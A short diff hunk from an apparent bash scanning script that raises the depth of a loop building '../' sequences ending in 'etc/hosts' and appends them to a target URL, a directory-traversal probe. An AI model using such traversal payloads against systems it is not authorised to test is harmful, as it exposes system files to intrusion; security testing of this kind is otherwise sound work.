@@ -35,7 +35,7 @@ fi
 
 echo "how deep is your love?" 
 
-depth=5
+depth=10
 for ((i=1; i<=depth; i++)); do 
 query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
 url2="${url}${query}"
